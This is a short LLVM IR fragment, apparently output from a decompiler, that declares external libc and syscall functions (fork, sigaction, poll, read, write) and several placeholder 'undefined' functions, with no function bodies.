declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i64 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
